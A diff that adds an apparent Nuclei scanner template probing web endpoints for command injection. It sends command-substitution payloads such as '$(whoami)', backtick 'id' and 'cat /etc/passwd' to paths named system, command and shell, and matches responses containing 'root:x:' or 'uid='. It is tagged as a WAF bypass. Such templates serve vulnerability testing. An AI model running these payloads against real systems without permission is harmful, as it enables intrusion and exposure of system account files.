@@ -1,0 +1,45 @@
+id: rce-p2
+
+info:
+  name: Command Injection - Command Substitution
+  author: custom
+  severity: critical
+  description: Command injection using command substitution ($(), backticks)
+  tags: rce,command-injection,waf-bypass,substitution
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?cmd={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        cmd={{payload}}
+
+    payloads:
+      payload:
+        - "$(ls -la)"
+        - "`ls -la`"
+        - "$(whoami)"
+        - "`whoami`"
+        - "$(id)"
+        - "cat /etc/passwd"
+        - "/bin/cat /etc/passwd"
+      path:
+        - "system"
+        - "command"
+        - "shell"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:"
+          - "bin/bash"
+          - "uid="
+        condition: or
